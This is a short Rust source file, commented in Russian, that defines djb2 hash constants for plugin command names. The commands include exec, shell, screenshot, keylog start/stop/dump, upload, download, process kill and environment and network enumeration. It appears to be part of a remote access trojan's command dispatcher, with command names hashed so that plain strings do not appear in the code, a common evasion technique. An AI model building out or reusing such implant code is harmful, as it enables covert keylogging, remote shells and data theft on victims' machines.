//! Хеши команд плагинов

use crate::hash::djb2;

pub const PING: u32 = djb2(b"ping");
pub const PONG: u32 = djb2(b"pong");
pub const EXEC: u32 = djb2(b"exec");
pub const SHELL: u32 = djb2(b"shell");
pub const SCREENSHOT: u32 = djb2(b"screenshot");
pub const KEYLOG: u32 = djb2(b"keylog");
pub const KEYLOG_START: u32 = djb2(b"keylog_start");
pub const KEYLOG_STOP: u32 = djb2(b"keylog_stop");
pub const KEYLOG_DUMP: u32 = djb2(b"keylog_dump");
pub const SYSINFO: u32 = djb2(b"sysinfo");
pub const UPLOAD: u32 = djb2(b"upload");
pub const DOWNLOAD: u32 = djb2(b"download");
pub const PS: u32 = djb2(b"ps");
pub const PROCLIST: u32 = djb2(b"proclist");
pub const KILL: u32 = djb2(b"kill");
pub const CD: u32 = djb2(b"cd");
pub const PWD: u32 = djb2(b"pwd");
pub const LS: u32 = djb2(b"ls");
pub const CAT: u32 = djb2(b"cat");
pub const MKDIR: u32 = djb2(b"mkdir");
pub const RM: u32 = djb2(b"rm");
pub const CP: u32 = djb2(b"cp");
pub const MV: u32 = djb2(b"mv");
pub const ENVVARS: u32 = djb2(b"envvars");
pub const NETINFO: u32 = djb2(b"netinfo");
pub const DISKINFO: u32 = djb2(b"diskinfo");
